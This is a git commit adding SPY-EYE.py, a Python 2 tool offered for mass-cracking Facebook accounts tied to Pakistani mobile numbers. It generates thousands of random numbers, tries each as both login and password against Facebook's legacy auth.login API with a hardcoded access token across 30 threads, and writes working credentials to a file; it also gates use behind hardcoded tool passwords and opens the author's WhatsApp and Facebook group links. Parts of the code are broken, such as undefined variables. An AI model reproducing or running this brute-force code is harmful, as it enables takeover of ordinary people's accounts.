748a1c1f51fd6111c2c3a8f054e6a37f8b9bd733
H A M I <88341594+HAMI-CODER@users.noreply.github.com>
2021-08-26 01:06:53 +0500

    Create SPY-EYE.py

---
+++ SPY-EYE.py
@@ -0,0 +1,273 @@
+# Decompiled By HAMI
+# Github : https://github.com/haMi302.git
+#coding=utf-8
+#!/usr/bin/python2
+#Script Written By HAMI
+#HAMI programmar
+#CraCker CODERS
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(5000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout =open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python2 ATTACKERS.py')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+def tik():
+    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
+    for o in titik:
+        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+
+
+def lodhirt():
+    lodhirt = [
+     'HAMI', '      ', 'CraCkeR', '      ', 'CoDeR', '      ', '']
+    for o in lodhirt:
+        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+        os.system('clear')
+os.system("figlet CONTACT OWNER  | lolcat") 
+os.system('xdg-open https://wa.me/+9203025604966')
+def approval():
+	time.sleep(1)
+	print logo
+CorrectAip = 'HAMI786302'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;97m\xe2\x9e\xa3Enter Your Aip Key : ')
+    if username == CorrectAip:
+            print '\x1b[1;92m[\xe2\x9c\x93] Logged in successfully '
+            time.sleep(0.5)
+            loop = 'false'
+       
+           
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+logo1 =os.system("figlet HAMI CraCker | lolcat")   
+logo2 =''
+CorrectUsername = 'HAMI'
+CorrectPassword = 'CraCker-XD'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;92m\x1b[1;92mTOOL USERNAME   \x1b[1;92m\xe2\x92\xb6 >>>> \x1b[1;92m')
+    if username == CorrectUsername:
+        password = raw_input('\x1b[1;92m \x1b[1;92mTOOL  PASSWORD \x1b[1;92m\xe2\x92\xb6 >>>> \x1b[1;92m')
+        if password == CorrectPassword:
+            print ' login successfully as \xe2\x92\xb6 HAMI CraCker'
+            time.sleep(2)
+            loop = 'false'
+        else:
+            print '\x1b[1;94mWrong Password'
+            os.system('xdg-open https://www.facebook.com/groups/758007028228808/')
+    else:
+        print '\x1b[1;94mWrong Username'
+        os.system('xdg-open https://www.facebook.com/groups/758007028228808/')
+
+def lisensi():
+    os.system('clear')
+    login()
+
+
+def login():
+    os.system('clear')
+    
+    
+    os.system("figlet HaMi CraCker | lolcat")
+    os.system("figlet AUTHOR Hami | lolcat")
+    os.system("figlet GITHUB    HAMI302 | lolcat")
+    os.system("figlet FB   HAMAD MALIK | lolcat")
+    print 47 * '\x1b[1;96m\xe2\x96\xac'
+    print("")
+    print '\033[1;98mSELECT NUMBER \n'
+    print 47 * '\x1b[1;96m\xe2\x96\xac'
+    print("")
+    print '\033[1;92m[1] \033[1;92m START\033[1;92m CRACKING PAKISTANI IDZ\n '
+    print '\033[1;91m[0]\033[1;91m Exit ( Back)\n '
+    pilih_login()
+
+def pilih_login():
+    bch = raw_input('\n\n \x1b[1;92m>   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        pilih_login()
+    elif bch == '1':
+        tik()
+    os.system('clear')
+    os.system("figlet [1] START  | lolcat")   
+    os.system("figlet Type 1 | lolcat")
+    
+    time.sleep(0.05)
+    
+    
+    action()
+
+
+def action():
+    global oks
+    global cpb
+    bch = raw_input('\n\n \x1b[1;92m>   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        tik()
+        os.system('clear')
+      
+        os.system("figlet MAIN CRACKER  | lolcat")   
+        
+        
+        print '\033[1;97mEnter any Pakistan Mobile code Number' + '\n'
+        print 'Enter any code 1--TO--49'
+        
+        
+        try:
+            c = raw_input('\033[1;92m\033[1;92mCHOOSE : ')
+            k = '03'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '0':
+        tik()
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    
+    xxx = str(len(id))
+    jalan('\033[1;92m Total Pakistan ids:\033[1;92m ' + '5000')
+    jalan('\033[1;92m password will be crack \033[1;92m7 digit\x1b[1;92m 11 digit....')
+    jalan('\033[1;92m Found password\033[1;92mUSER..')
+    jalan('\033[1;92m Total Password \033[1;92m    ' + '5000')
+    jalan('\033[1;92m Code you choose\033[1;92m: ' + c)
+    jalan('\033[1;92m Stop Process Press\033[1;92m Ctrl+z')
+    os.system("figlet  NOTE USE FAST 4G INTERNET FOR SPEED|lolcat")   
+    os.system("figlet  WAIT  | lolcat")   
+    print("")
+    print 47 * '\x1b[1;96m\xe2\x96\xac'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('avs')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\033[1;92m[HAMI-OK]  ' + uid + ' | '  +  pass1
+                okb = open('avs/successfull.txt', 'a')
+                okb.write(uid + ' | ' + pass1 + '\n')
+                okb.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\033[1;92m[HAMI-OK]   ' + uid + ' | '   +  pass1
+                oks = open('avs/successfull.txt', 'a')
+                oks.write(uid  +  ' | ' + pass1 + '\n')
+                oks.close()
+                okb.append(uid + pass1)
+            else:
+                pass2 = k + c + user
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\033[1;92m[HAMI-OK]   ' + uid + ' | '  + pass2
+                    okb = open('avs/successfull.txt', 'a')
+                    okb.write(uid + ' | ' + pass2 + '\n')
+                    okb.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;91m[HAMI-CP]   ' + uid + ' | '  + pass2
+                    cps = open('avs/Successfull.txt', 'a')
+                    cps.write(uid + ' | ' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(uid + pass2)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;91m-'
+    print 'Process Has Been Completed ...'
+    print 'Total CraCk Account : ' + str(len(oks)) + '/' + str(len(cpb))
+    print 'Cloned Accounts Has Been hack : ,ok/cp.txt'
+    jalan('Note : Your HaCk account Will Open after Just now')            
+    os.system("figlet GOOD LUCK  | lolcat")   
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    login()
+
+
+if __name__ == '__main__':
+    login()
